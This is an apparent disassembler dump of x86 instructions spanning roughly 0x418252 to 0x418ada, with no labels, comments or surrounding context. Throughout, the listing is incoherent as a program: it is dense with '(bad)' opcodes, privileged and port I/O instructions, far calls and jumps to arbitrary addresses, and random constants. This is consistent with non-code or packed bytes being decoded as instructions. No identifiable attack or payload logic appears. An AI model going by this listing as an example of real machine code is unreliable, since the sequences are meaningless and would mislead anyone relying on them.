  418252:	fist   DWORD PTR [ecx]
  418254:	sbb    bh,BYTE PTR [esi+0x53]
  418257:	div    BYTE PTR [ebx+0x49]
  41825a:	popf   
  41825b:	call   0xb2f1cfba
  418260:	inc    esp
  418261:	nop    DWORD PTR [esi]
  418264:	(bad)  
  418265:	bnd lock call 0x6e94cfb9
  41826c:	jl     0x41829d
  41826e:	call   0x4d24:0xf77e8ee5
  418275:	in     al,dx
  418276:	dec    ebp
  418277:	mov    edi,0xd37bac4b
  41827c:	rcr    DWORD PTR [esi],cl
  41827e:	dec    eax
  41827f:	jo     0x418207
  418281:	test   al,0x7c
  418283:	jp     0x41821c
  418285:	xor    ch,BYTE PTR [esi+0x5]
  418288:	jne    0x41821f
  41828a:	retf   
  41828b:	or     ebp,esi
  41828d:	dec    ebp
  41828e:	push   ebx
  41828f:	bound  ecx,QWORD PTR [eax-0x5003227a]
  418295:	cmp    al,0xdb
  418297:	dec    esp
  418298:	scas   eax,DWORD PTR es:[edi]
  418299:	mov    bl,0x4c
  41829b:	int    0xd2
  41829d:	lods   eax,DWORD PTR ds:[esi]
  41829e:	inc    ecx
  41829f:	in     al,0xa4
  4182a1:	nop
  4182a2:	mov    edx,DWORD PTR [ebp-0x3]
  4182a5:	inc    edi
  4182a6:	jb     0x41831a
  4182a8:	dec    edx
  4182a9:	aam    0xf5
  4182ab:	dec    ebp
  4182ac:	out    0x8e,al
  4182ae:	fld    DWORD PTR [edx]
  4182b0:	push   eax
  4182b1:	mov    ds:0x31b06df2,al
  4182b6:	mov    cl,0x74
  4182b8:	xor    DWORD PTR [esi],ebp
  4182ba:	jp     0x4182d9
  4182bc:	inc    ecx
  4182bd:	icebp  
  4182be:	mov    ds:0xd036b412,eax
  4182c3:	fs in  al,dx
  4182c5:	fistp  WORD PTR [edx]
  4182c7:	xchg   edx,eax
  4182c8:	out    dx,al
  4182c9:	push   ecx
  4182ca:	jl     0x4182f4
  4182cc:	test   ch,ch
  4182ce:	dec    ebx
  4182cf:	out    dx,eax
  4182d0:	loop   0x4182ac
  4182d2:	dec    esp
  4182d3:	pop    ebp
  4182d4:	and    ch,BYTE PTR ds:0xf1734e57
  4182da:	add    DWORD PTR [ecx-0x25],0xa76a590b
  4182e1:	sub    DWORD PTR [edi+0x40f97332],esi
  4182e7:	int3   
  4182e8:	inc    edi
  4182e9:	inc    eax
  4182ea:	and    DWORD PTR [ecx+0x7631f2dd],esi
  4182f0:	add    edx,edi
  4182f2:	pop    ecx
  4182f3:	inc    edx
  4182f4:	adc    ah,cl
  4182f6:	jl     0x41830d
  4182f8:	push   esp
  4182f9:	inc    ebx
  4182fa:	cmp    ch,BYTE PTR [edx-0x4c]
  4182fd:	inc    ecx
  4182fe:	sub    edx,DWORD PTR [edx+0x7f]
  418301:	xchg   BYTE PTR [ebx+0x64c33c06],cl
  418307:	retf   0x287d
  41830a:	mov    edx,0x1972d117
  41830f:	xchg   ecx,eax
  418310:	imul   eax,DWORD PTR [ebp-0x67d9ad93],0xb
  418317:	cli    
  418318:	mov    cl,ah
  41831a:	jg     0x4182c9
  41831c:	mov    esp,0xda616ae8
  418321:	rcr    BYTE PTR [edx],0x23
  418324:	(bad)  
  418325:	mov    al,0xbb
  418327:	pop    ss
  418328:	cmp    bl,bl
  41832a:	in     eax,dx
  41832b:	pop    ss
  41832c:	inc    eax
  41832d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832e:	mov    ch,0xe9
  418330:	and    eax,0xf129f929
  418335:	es aas 
  418337:	mov    ebp,0xf49b3fb
  41833c:	sub    eax,0x22ae1afc
  418341:	test   al,0xe8
  418343:	jmp    0x418348
  418345:	pop    ss
  418346:	loop   0x418367
  418348:	mov    ecx,0x13aa2c92
  41834d:	outs   dx,BYTE PTR ds:[esi]
  41834e:	ja     0x41833c
  418350:	jl     0x418334
  418352:	enter  0x2c3d,0x2b
  418356:	sub    eax,0xdf1724f0
  41835b:	sub    esi,eax
  41835d:	arpl   WORD PTR [edx-0x2a3b746f],sp
  418363:	mov    edx,ebp
  418365:	outs   dx,DWORD PTR ds:[esi]
  418366:	fdivr  st,st(6)
  418368:	in     al,0xc
  41836a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41836c:	in     eax,dx
  41836d:	aad    0x71
  41836f:	mul    DWORD PTR [ebp-0x19f6b07d]
  418375:	sahf   
  418376:	xor    eax,0x10
  418379:	mov    ch,0x3e
  41837b:	div    DWORD PTR [eax-0x62f74ffa]
  418381:	out    0xcb,eax
  418383:	cmp    al,0x83
  418385:	lahf   
  418386:	push   ss
  418387:	xor    BYTE PTR [esi+0x28365d74],0xd5
  41838e:	addr16 push edi
  418390:	pop    ss
  418391:	jbe    0x4183c8
  418393:	ss pop ecx
  418395:	sahf   
  418396:	or     ah,dh
  418398:	ins    BYTE PTR es:[edi],dx
  418399:	bound  edx,QWORD PTR [ebx+0x6f]
  41839c:	cmp    DWORD PTR [ebx-0x39b84d10],eax
  4183a2:	arpl   WORD PTR [esi-0x4855c9d2],cx
  4183a8:	or     cl,bl
  4183aa:	mov    ds:0xf288af5d,al
  4183af:	lods   al,BYTE PTR ds:[esi]
  4183b0:	dec    BYTE PTR [esi+0xf4d64b1]
  4183b6:	pop    ecx
  4183b7:	mov    bl,0x12
  4183b9:	sub    ecx,DWORD PTR [ebp+0x3a]
  4183bc:	(bad)  
  4183bd:	adc    DWORD PTR [eax-0x5],eax
  4183c0:	dec    esi
  4183c1:	jno    0x4183aa
  4183c3:	dec    eax
  4183c4:	cmp    dl,dl
  4183c6:	push   esp
  4183c7:	ror    DWORD PTR [eax+eiz*4+0x7d],cl
  4183cb:	inc    ecx
  4183cc:	push   ebp
  4183cd:	adc    edx,DWORD PTR [eax-0x794600bc]
  4183d3:	sbb    al,0x14
  4183d5:	into   
  4183d6:	mov    edx,0x4c440b40
  4183db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183dc:	nop
  4183dd:	jmp    0xfb58:0x979d9875
  4183e4:	xchg   ecx,eax
  4183e5:	leave  
  4183e6:	and    al,0x38
  4183e8:	test   BYTE PTR [ecx+0xa],ah
  4183eb:	ja     0x41841e
  4183ed:	fadd   QWORD PTR ds:0x63d2f3d0
  4183f3:	test   BYTE PTR [esi],al
  4183f5:	jae    0x4183ea
  4183f7:	mov    bh,0x40
  4183f9:	jg     0x4183c9
  4183fb:	xchg   ebp,eax
  4183fc:	mov    ebx,0x1fcb813d
  418401:	gs mov esi,0xa721ca00
  418407:	xchg   BYTE PTR [eax],dl
  418409:	fistp  WORD PTR [edi+0x18ffbfa3]
  41840f:	sub    DWORD PTR [ebx+0x40],esp
  418412:	dec    ebx
  418413:	ja     0x4183c3
  418415:	stc    
  418416:	inc    eax
  418417:	gs outs dx,DWORD PTR es:[esi]
  41841a:	popf   
  41841b:	(bad)  ds:0x13aeac23
  418421:	pop    esi
  418422:	xchg   BYTE PTR [eax],bl
  418424:	or     BYTE PTR [ecx-0x7b],0x5
  418428:	dec    ebx
  418429:	in     al,dx
  41842a:	mov    ebp,0xddaf79ae
  41842f:	mov    edi,0x1b24fbf6
  418434:	sti    
  418435:	aas    
  418436:	fs rcr al,cl
  418439:	retf   
  41843a:	mov    ds:0xaf83a3d4,eax
  41843f:	mov    ebp,DWORD PTR [eax+0x66]
  418442:	inc    esp
  418443:	arpl   cx,bx
  418445:	adc    DWORD PTR [eax+0x3c815a3a],ecx
  41844b:	inc    eax
  41844c:	mov    ah,0xb8
  41844e:	or     eax,0x8960dfc8
  418453:	stos   BYTE PTR es:[edi],al
  418454:	pusha  
  418455:	sub    DWORD PTR [eax],0xffffffc6
  418458:	test   DWORD PTR [ebx],ebx
  41845a:	or     eax,0x319eecf6
  41845f:	je     0x4183f7
  418461:	jl     0x418454
  418463:	dec    ebp
  418464:	mov    ch,0x86
  418466:	cld    
  418467:	and    eax,0xdec98ce
  41846c:	mov    esp,0x1cfce4d1
  418471:	neg    DWORD PTR [ecx+0x32]
  418474:	dec    edi
  418475:	das    
  418476:	mov    bl,BYTE PTR [ecx+0x5c]
  418479:	ds xchg ebx,eax
  41847b:	adc    BYTE PTR [ebx+0x7],al
  41847e:	les    eax,FWORD PTR [esp+edi*4]
  418481:	loop   0x418433
  418483:	aaa    
  418484:	std    
  418485:	jns    0x41847e
  418487:	imul   ecx,DWORD PTR [edi-0x36],0xf365e7d8
  41848e:	inc    ebx
  41848f:	add    BYTE PTR cs:[ebx],cl
  418492:	mov    edx,esi
  418494:	(bad)  
  418496:	adc    DWORD PTR [edi+0x0],esp
	...
  418514:	push   edi
  418515:	lea    esp,[ecx+0x7e]
  418518:	sti    
  418519:	(bad)  
  41851a:	pop    edi
  41851b:	lods   eax,DWORD PTR ds:[esi]
  41851c:	into   
  41851d:	fisttp DWORD PTR [edx+0x58]
  418520:	mov    esp,0x25892140
  418525:	daa    
  418526:	add    DWORD PTR [eax],eax
  418528:	ins    BYTE PTR es:[edi],dx
  418529:	pop    es
  41852a:	add    BYTE PTR [eax],al
  41852c:	dec    ebp
  41852d:	mov    al,0xec
  41852f:	jg     0x4184f0
  418531:	pop    eax
  418532:	xchg   ebp,eax
  418533:	imul   ebx,DWORD PTR [edx+0x39],0x260a63b4
  41853a:	or     edi,DWORD PTR [ecx+0x36]
  41853d:	cmp    DWORD PTR [eax],ebp
  41853f:	cmp    dl,al
  418541:	into   
  418542:	ja     0x418592
  418544:	adc    esi,DWORD PTR [ebp-0x6c]
  418547:	outs   dx,BYTE PTR ds:[esi]
  418548:	rol    ch,0xd
  41854b:	loopne 0x41854a
  41854d:	cmp    ch,BYTE PTR [esp+ebx*4+0x3c]
  418551:	outs   dx,BYTE PTR ds:[esi]
  418552:	cmc    
  418553:	aas    
  418554:	daa    
  418555:	cmc    
  418556:	inc    ebx
  418557:	sub    ebp,DWORD PTR [ebp+edx*4-0x27]
  41855b:	sbb    al,0x27
  41855d:	scas   eax,DWORD PTR es:[edi]
  41855e:	xor    al,0x59
  418560:	retf   0x411e
  418563:	pop    esi
  418564:	adc    edx,eax
  418566:	addr16 repz cmp cl,bh
  41856a:	pop    edi
  41856b:	sbb    dh,BYTE PTR [esi+0x22]
  41856e:	sbb    ch,ah
  418570:	les    ebx,FWORD PTR [eax]
  418572:	dec    esp
  418573:	das    
  418574:	scas   eax,DWORD PTR es:[edi]
  418575:	pop    es
  418576:	(bad)  
  418577:	sub    eax,0x3e3d3971
  41857c:	(bad)  
  41857e:	jp     0x418506
  418580:	fiadd  DWORD PTR [esi-0x1c]
  418583:	sbb    edx,DWORD PTR [edi+0x44]
  418586:	and    ah,BYTE PTR [ebp-0x7f]
  418589:	pushf  
  41858a:	dec    ebp
  41858b:	retf   
  41858c:	jbe    0x4185da
  41858e:	fld    QWORD PTR [ebx-0x7b36456]
  418594:	(bad)  
  418595:	pop    esp
  418596:	gs inc edx
  418598:	mov    ah,BYTE PTR [ebp+0x62df3a3f]
  41859e:	mov    BYTE PTR [ecx*8+0x7e7059ec],ah
  4185a5:	mov    edx,0x9be1e1df
  4185aa:	inc    edi
  4185ab:	scas   al,BYTE PTR es:[edi]
  4185ac:	test   al,0xe
  4185ae:	call   0x4c3fcf7c
  4185b3:	push   esp
  4185b4:	sub    al,0xc7
  4185b6:	test   DWORD PTR [edi+0x5c],edi
  4185b9:	sbb    bh,bh
  4185bb:	add    BYTE PTR [edx-0x5f],cl
  4185be:	jmp    0x8e753921
  4185c3:	fst    QWORD PTR [ebp+edi*2-0xa]
  4185c7:	jb     0x41854f
  4185c9:	jae    0x4185fc
  4185cb:	xchg   ebx,eax
  4185cc:	push   cs
  4185cd:	sub    al,0x95
  4185cf:	loope  0x4185ae
  4185d1:	dec    eax
  4185d2:	aaa    
  4185d3:	repnz setle BYTE PTR [ecx+0x7b]
  4185d8:	or     esp,eax
  4185da:	sahf   
  4185db:	dec    edx
  4185dc:	cmp    al,BYTE PTR [eax-0x7894d234]
  4185e2:	loopne 0x418591
  4185e4:	or     edi,esp
  4185e6:	es addr16 test al,0x1c
  4185ea:	mul    bh
  4185ec:	test   BYTE PTR fs:[eax-0x6015660],ah
  4185f3:	imul   ebx,ebp,0xf237c9b6
  4185f9:	mov    ds:0xae4fb6b2,al
  4185fe:	xor    eax,0x9847621b
  418603:	xchg   edx,eax
  418604:	adc    al,0x2c
  418606:	sub    eax,0x96ce4c9f
  41860b:	into   
  41860c:	inc    edi
  41860d:	jbe    0x418619
  41860f:	cmp    ecx,DWORD PTR [edi]
  418611:	call   0xf4f572e2
  418616:	xchg   esi,eax
  418617:	lock pop edi
  418619:	or     ebx,DWORD PTR [esi+0x74]
  41861c:	and    DWORD PTR [esp+eiz*2-0x4a],ebp
  418620:	das    
  418621:	mov    ds:0xd6676598,al
  418626:	shr    DWORD PTR [esi],1
  418628:	loopne 0x418650
  41862a:	add    dh,BYTE PTR [eax-0x4feb5718]
  418630:	xor    BYTE PTR ds:0xa7db2475,al
  418636:	push   ecx
  418637:	xor    bh,ah
  418639:	mov    bl,0x2f
  41863b:	jg     0x41861d
  41863d:	cmp    BYTE PTR [ebx-0x4d46427c],bl
  418643:	dec    eax
  418644:	test   DWORD PTR [ecx],edx
  418646:	ror    bl,0x5e
  418649:	xor    eax,0xa991619b
  41864e:	pop    ebp
  41864f:	mov    dh,0xb7
  418651:	inc    ecx
  418652:	and    cl,dh
  418654:	push   ebp
  418655:	xchg   edi,eax
  418656:	call   0xc55e:0x4ba15a61
  41865d:	shr    esi,0x9a
  418660:	stc    
  418661:	pop    ss
  418662:	in     al,0xe0
  418664:	push   ecx
  418665:	fld    DWORD PTR [ecx+0x686a31fb]
  41866b:	out    dx,al
  41866c:	pop    es
  41866d:	push   ss
  41866e:	in     al,0x74
  418670:	inc    ecx
  418671:	js     0x4186bf
  418673:	int3   
  418674:	repnz inc esp
  418676:	frstor [edi+0x53]
  418679:	shr    BYTE PTR [ecx-0x2fdccd1e],cl
  41867f:	ror    esp,0xb6
  418682:	iret   
  418683:	dec    eax
  418684:	fdiv   st,st(3)
  418686:	jmp    DWORD PTR ds:0xa0503f19
  41868c:	pop    ebp
  41868d:	sbb    esp,DWORD PTR ds:[ecx]
  418690:	or     DWORD PTR [ebx-0x34],eax
  418693:	dec    edx
  418694:	add    eax,edi
  418696:	je     0x418705
  418698:	and    BYTE PTR [edx-0x43],ch
  41869b:	pop    edx
  41869c:	sub    BYTE PTR [ecx+0x14],0x8c
  4186a0:	nop
  4186a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186a2:	cmc    
  4186a3:	and    DWORD PTR [esi],esi
  4186a5:	inc    ebx
  4186a6:	xor    al,BYTE PTR [edx+0x76]
  4186a9:	jne    0x4186c5
  4186ab:	jp     0x4186b6
  4186ad:	add    eax,0xcd28b7e2
  4186b2:	adc    eax,0xc3cd4b61
  4186b7:	es push ss
  4186b9:	sbb    al,0xbd
  4186bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186bc:	cmp    cl,BYTE PTR [ebp+ebp*1-0x74]
  4186c0:	mov    ecx,0xb2613e4
  4186c5:	push   ebx
  4186c6:	pop    ds
  4186c7:	popf   
  4186c8:	int3   
  4186c9:	jbe    0x418667
  4186cb:	ins    DWORD PTR es:[edi],dx
  4186cc:	test   al,0x46
  4186ce:	sar    DWORD PTR [eax+eiz*4+0x5ca6bee8],0x80
  4186d6:	mov    BYTE PTR [edi-0x7d9b93ac],0xbf
  4186dd:	adc    DWORD PTR [edi+edx*8-0x6237b1b3],esi
  4186e4:	jecxz  0x418730
  4186e6:	adc    eax,0xd4fc17a3
  4186eb:	dec    ebp
  4186ec:	pop    ss
  4186ed:	out    0x49,eax
  4186ef:	jl     0x41868b
  4186f1:	in     al,dx
  4186f2:	pop    esp
  4186f3:	pop    esi
  4186f4:	push   0x6f41a27b
  4186f9:	sub    ebp,edi
  4186fb:	mov    ebx,gs
  4186fd:	enter  0x719f,0x5d
  418701:	xor    DWORD PTR [ebx-0x11b1da33],ecx
  418707:	in     al,dx
  418708:	mov    edi,edi
  41870a:	xchg   esi,eax
  41870b:	push   ds
  41870c:	pop    ss
  41870d:	adc    al,0xb5
  41870f:	dec    eax
  418710:	test   bh,0x3d
  418713:	jmp    0x5b1d:0x9e55db3
  41871a:	sub    eax,0x39aadb22
  41871f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418720:	in     al,dx
  418721:	mov    WORD PTR ds:0x18ffa95a,cs
  418727:	inc    ecx
  418728:	pop    eax
  418729:	mov    edx,0x8e012702
  41872e:	sbb    bl,ah
  418730:	xchg   ebx,eax
  418731:	es cmc 
  418733:	push   ds
  418734:	inc    ebp
  418735:	imul   DWORD PTR [ebx]
  418737:	xor    BYTE PTR [edx+0x3a],bh
  41873a:	and    al,0x96
  41873c:	adc    al,ch
  41873e:	xor    eax,0xa905a103
  418743:	jmp    0xa89e8e0d
  418748:	add    BYTE PTR [esp+edx*8+0x15e84745],0xae
  418750:	mov    eax,0x259d0f95
  418755:	ja     0x418789
  418757:	je     0x418747
  418759:	lock sub BYTE PTR [ebx-0x50],ah
  41875d:	mov    esi,0x71025ead
  418762:	mov    ecx,0x61f83926
  418767:	sbb    eax,0x2290749d
  41876c:	inc    edi
  41876d:	sbb    edi,DWORD PTR [esi]
  41876f:	shr    BYTE PTR [ebx-0x1e6f135b],cl
  418775:	rol    BYTE PTR [ecx],0xe3
  418778:	push   ebp
  418779:	sub    bl,BYTE PTR [edx+0x23]
  41877c:	inc    esp
  41877d:	cmp    bl,BYTE PTR [ebx]
  41877f:	dec    edi
  418780:	mov    ds:0x69e09fec,eax
  418785:	clc    
  418786:	jmp    0x4187e4
  418788:	jge    0x41879a
  41878a:	lea    edx,[ecx-0x19]
  41878d:	fdivr  DWORD PTR [esp+eax*2]
  418790:	cmc    
  418791:	clc    
  418792:	js     0x4187b5
  418794:	neg    DWORD PTR [ecx-0x6e]
  418797:	add    eax,0x77c4e1f2
  41879c:	int3   
  41879d:	mov    al,ds:0xe879b021
  4187a2:	push   esi
  4187a3:	lea    ebx,[edx+0x313bb1f6]
  4187a9:	ja     0x4187c5
  4187ab:	pop    esp
  4187ac:	es cli 
  4187ae:	pop    edi
  4187af:	xchg   esp,eax
  4187b0:	inc    esp
  4187b1:	adc    bl,BYTE PTR [eax-0x76]
  4187b4:	pop    ss
  4187b5:	inc    edi
  4187b6:	clc    
  4187b7:	jmp    0x69e0:0xd6f73a8a
  4187be:	add    BYTE PTR [ebp+0x44a70433],ch
  4187c4:	lock jge 0x4187a9
  4187c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187c8:	xchg   BYTE PTR [edi],dh
  4187ca:	rcl    BYTE PTR ds:[edx],1
  4187cd:	out    dx,al
  4187ce:	adc    eax,0x415862e2
  4187d3:	mov    ds:0x12feb685,al
  4187d8:	push   ds
  4187d9:	les    edx,FWORD PTR [esi]
  4187db:	iret   
  4187dc:	mov    bl,0x77
  4187de:	add    eax,0x6784443d
  4187e3:	dec    ebx
  4187e4:	hlt    
  4187e5:	jecxz  0x4187d1
  4187e7:	sub    eax,0x7b6e763c
  4187ec:	jp     0x418825
  4187ee:	pop    ebp
  4187ef:	push   ebp
  4187f0:	cmc    
  4187f1:	ds xor ebp,edi
  4187f4:	call   0x524b7fe0
  4187f9:	push   eax
  4187fa:	jb     0x418801
  4187fc:	je     0x41881b
  4187fe:	mov    ebx,0x3ec0c694
  418803:	shr    DWORD PTR [esp+ebp*8-0x13b6a33f],0x37
  41880b:	sub    dl,0xc3
  41880e:	xor    ecx,ebx
  418810:	xor    ecx,0x56
  418813:	fiadd  DWORD PTR [esi]
  418815:	shl    DWORD PTR [eax],cl
  418817:	xchg   ecx,ecx
  418819:	xor    DWORD PTR [ebx],esp
  41881b:	jmp    0xffe7f8e8
  418820:	loope  0x4187e0
  418822:	sub    ch,cl
  418824:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418825:	rcr    BYTE PTR [ebx+0x1c],cl
  418828:	xor    dh,dl
  41882a:	test   eax,0xa7f5f4ed
  41882f:	push   cs
  418830:	or     DWORD PTR [eax+eiz*2],eax
  418833:	sub    ch,BYTE PTR [ecx+0x319afa2f]
  418839:	mov    edi,0x2cf60f35
  41883e:	or     al,BYTE PTR [esi+0x5c82ef5c]
  418844:	push   ecx
  418845:	pushf  
  418846:	dec    eax
  418847:	ret    0x3857
  41884a:	pop    esp
  41884b:	dec    ecx
  41884c:	enterw 0xe257,0xd0
  418851:	pop    edx
  418852:	pop    edx
  418853:	inc    ecx
  418854:	and    esp,DWORD PTR ds:0x5f638de3
  41885a:	push   cs
  41885b:	dec    edx
  41885c:	inc    edx
  41885d:	pop    ebx
  41885e:	mov    ah,0x37
  418860:	mov    dl,0x88
  418862:	pop    edx
  418863:	je     0x418859
  418865:	mov    WORD PTR [ecx-0x3],ss
  418868:	sbb    ch,BYTE PTR gs:[eax-0xd066f62]
  41886f:	sbb    ch,BYTE PTR [eax]
  418871:	adc    esi,DWORD PTR [esi]
  418873:	imul   ebx,DWORD PTR [ecx],0x22
  418876:	mov    ebp,0x975f4dfa
  41887b:	retf   
  41887c:	lds    edi,FWORD PTR [esi-0x7e]
  41887f:	and    al,0x77
  418881:	pushf  
  418882:	jnp    0x41883a
  418884:	pushf  
  418885:	(bad)  
  418886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418887:	jmp    0x592aae22
  41888c:	jb     0x418815
  41888e:	pop    esp
  41888f:	fiadd  WORD PTR [edx-0x32ab9658]
  418895:	sbb    al,0xde
  418897:	ffree  st(3)
  418899:	add    DWORD PTR [edi-0x7c],ecx
  41889c:	cmp    eax,DWORD PTR ds:0x192bf8b9
  4188a2:	add    edx,DWORD PTR [ecx]
  4188a4:	ss and ebp,ecx
  4188a7:	test   BYTE PTR [esi+esi*8],dl
  4188aa:	daa    
  4188ab:	test   bh,dh
  4188ad:	jno    0x418908
  4188af:	aad    0xf7
  4188b1:	retf   0x78ff
  4188b4:	loope  0x4188b6
  4188b6:	clc    
  4188b7:	push   es
  4188b8:	jne    0x4188a8
  4188ba:	xor    DWORD PTR [edx-0x38238466],ecx
  4188c0:	pusha  
  4188c1:	cwde   
  4188c2:	sbb    al,0x6c
  4188c4:	out    dx,eax
  4188c5:	mov    edi,0x991a65d7
  4188ca:	jmp    0x41893f
  4188cc:	sub    bl,dl
  4188ce:	adc    eax,0x79aea7a4
  4188d3:	es sti 
  4188d5:	cwde   
  4188d6:	call   0xaef9:0xb6bba1f4
  4188dd:	pop    esp
  4188de:	loope  0x4188cf
  4188e0:	mov    WORD PTR ds:0x19bc0820,?
  4188e6:	aas    
  4188e7:	or     al,0x5
  4188e9:	pop    es
  4188ea:	jmp    0x4188fc
  4188ec:	ins    BYTE PTR es:[edi],dx
  4188ed:	iret   
  4188ee:	test   DWORD PTR [edx+0x77cccbd7],eax
  4188f4:	es (bad) 
  4188f7:	push   ebx
  4188f8:	sub    eax,0x36b79412
  4188fd:	push   ebx
  4188fe:	aaa    
  4188ff:	cmp    eax,0xea715067
  418904:	push   esp
  418905:	fwait
  418906:	sub    edx,DWORD PTR [edi+0x417b6be6]
  41890c:	bound  edx,QWORD PTR ds:0xec69b434
  418912:	(bad)  
  418913:	(bad)  [edx+0x59]
  418916:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418917:	mov    cx,0xbc9e
  41891b:	xchg   ebx,eax
  41891c:	mov    DWORD PTR ds:0x2ecb6c02,ebp
  418922:	sub    dh,ah
  418924:	jmp    0x1ff86ab5
  418929:	sbb    DWORD PTR [ecx-0x50cf532],esp
  41892f:	mov    ch,0xb1
  418931:	repz jnp 0x418911
  418934:	jg     0x41890f
  418936:	and    BYTE PTR [ebp-0x2],dh
  418939:	sbb    eax,0xdbfb935d
  41893e:	push   cs
  41893f:	hlt    
  418940:	push   esi
  418941:	sbb    eax,0x2c41a85f
  418946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418947:	push   edx
  418948:	mov    dh,0x7a
  41894a:	dec    ebp
  41894b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41894c:	call   0x2625:0x8befe582
  418953:	call   0x980c:0x6487f4b9
  41895a:	inc    eax
  41895b:	push   ebx
  41895c:	or     BYTE PTR [ebp-0x3272abd5],bl
  418962:	xchg   ecx,eax
  418963:	div    DWORD PTR [eax]
  418965:	mov    esi,0x736b5aa7
  41896a:	neg    BYTE PTR [esi+0x69]
  41896d:	sub    ebx,esi
  41896f:	jge    0x418938
  418971:	cmp    ah,bl
  418973:	dec    eax
  418974:	scas   eax,DWORD PTR es:[edi]
  418975:	and    eax,0x7eb62394
  41897a:	adc    DWORD PTR [ecx-0x68],ebx
  41897d:	sbb    ecx,DWORD PTR [edi-0x34]
  418980:	jae    0x4189d3
  418982:	jns    0x418970
  418984:	sub    DWORD PTR [edx+eiz*8-0x2e],esp
  418988:	(bad)  [ecx-0x35e5c97e]
  41898f:	inc    edx
  418990:	add    eax,0xca1d1b8d
  418995:	nop
  418996:	mov    ah,ch
  418998:	jl     0x418a09
  41899a:	dec    esi
  41899b:	ins    BYTE PTR es:[edi],dx
  41899c:	mov    al,ds:0xff17ad86
  4189a1:	or     eax,0x3895008d
  4189a6:	pop    es
  4189a7:	jmp    0x418958
  4189a9:	mov    al,ds:0xccf394ae
  4189ae:	cmp    eax,0xe44bf8f4
  4189b3:	sub    DWORD PTR [ebp+0x3764f9b0],edx
  4189b9:	clc    
  4189ba:	(bad)  
  4189bb:	fcomp  DWORD PTR [edx+esi*8]
  4189be:	jb     0x4189b3
  4189c0:	loop   0x418996
  4189c2:	rcl    BYTE PTR [esi-0x11ad2d70],1
  4189c8:	int    0x2f
  4189ca:	push   ebp
  4189cb:	ficomp DWORD PTR [eax+0xc]
  4189ce:	retf   0x937b
  4189d1:	repz stc 
  4189d3:	add    al,BYTE PTR [eax+esi*4]
  4189d6:	mov    esi,0x4cba6147
  4189db:	ret    
  4189dc:	jp     0x418a14
  4189de:	mov    eax,ecx
  4189e0:	xor    BYTE PTR [edi-0x44],bl
  4189e3:	(bad)
  4189e6:	mov    al,0x77
  4189e8:	pop    ds
  4189e9:	push   eax
  4189ea:	test   al,0xe
  4189ec:	cmp    cl,ch
  4189ee:	mov    ecx,0x499d29d1
  4189f3:	stos   DWORD PTR es:[edi],eax
  4189f4:	aad    0x90
  4189f6:	push   es
  4189f7:	and    eax,0x93c48679
  4189fc:	push   es
  4189fd:	pop    ebp
  4189fe:	or     al,0x6a
  418a00:	test   ah,0xd5
  418a03:	jae    0x418a59
  418a05:	je     0x4189a5
  418a07:	sub    BYTE PTR [eax+0x17a68148],ah
  418a0d:	test   BYTE PTR [edx+0x61],0x28
  418a11:	icebp  
  418a12:	or     ecx,DWORD PTR [eax-0x54]
  418a15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a16:	sub    DWORD PTR [ecx-0x7e98fa66],ebp
  418a1c:	dec    edi
  418a1d:	or     edi,DWORD PTR [edx+ecx*2-0x25]
  418a21:	sbb    ch,ch
  418a23:	xchg   edx,eax
  418a24:	pop    ebx
  418a25:	fnstsw WORD PTR [ebx+0x780b60e2]
  418a2b:	out    0xcf,eax
  418a2d:	sub    eax,ebx
  418a2f:	push   edi
  418a30:	adc    eax,0x94a25c52
  418a35:	sbb    eax,0x34fe82d
  418a3a:	mov    edx,0x22da5383
  418a3f:	push   esi
  418a40:	jmp    0x7a99:0x42e0af05
  418a47:	rcr    edx,1
  418a49:	cli    
  418a4a:	imul   DWORD PTR [edx]
  418a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a4d:	stc    
  418a4e:	add    ecx,DWORD PTR [edx-0x7deef343]
  418a54:	jno    0x4189e0
  418a56:	popa   
  418a57:	das    
  418a58:	ror    DWORD PTR [ecx],cl
  418a5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a5b:	(bad)  
  418a5c:	jle    0x418a74
  418a5e:	sbb    eax,0xb26bc3f4
  418a63:	add    BYTE PTR [ecx],bh
  418a65:	dec    esi
  418a66:	sbb    cl,BYTE PTR [edi-0x56c3ff71]
  418a6c:	icebp  
  418a6d:	mov    WORD PTR [eax-0x2da7b017],es
  418a73:	and    ah,cl
  418a75:	aad    0x31
  418a77:	cld    
  418a78:	imul   edi,DWORD PTR cs:[ecx-0x6],0xd2da7a71
  418a80:	mov    ebp,0x27f5362f
  418a85:	(bad)  
  418a86:	test   DWORD PTR ds:0xf6144d6c,esp
  418a8c:	push   edx
  418a8d:	std    
  418a8e:	lods   al,BYTE PTR ds:[esi]
  418a8f:	push   ds
  418a90:	clc    
  418a91:	dec    edi
  418a92:	leave  
  418a93:	shl    BYTE PTR [edx+esi*2],1
  418a96:	stos   BYTE PTR es:[edi],al
  418a97:	(bad)  
  418a98:	fbld   TBYTE PTR [ebx-0x25]
  418a9b:	or     al,BYTE PTR [ebx+edx*2+0x67be8e57]
  418aa2:	inc    edx
  418aa3:	mov    ecx,0xf928aafa
  418aa8:	loope  0x418ab8
  418aaa:	hlt    
  418aab:	mov    ecx,0x48882894
  418ab0:	dec    ecx
  418ab1:	retf   
  418ab2:	add    cl,BYTE PTR [eiz*2-0xb276a3f]
  418ab9:	dec    ecx
  418aba:	pop    ebx
  418abb:	xchg   ecx,eax
  418abc:	dec    eax
  418abd:	mov    DWORD PTR [ebx-0x19faa598],0xcbaf7639
  418ac7:	dec    esi
  418ac8:	sub    eax,0xd8cbd780
  418acd:	adc    BYTE PTR [ecx+0x68],ch
  418ad0:	add    BYTE PTR [eax+0x6657ec66],0xf3
  418ad7:	xchg   esp,eax
  418ad8:	mov    bh,0xcc
  418ada:	pop    ecx
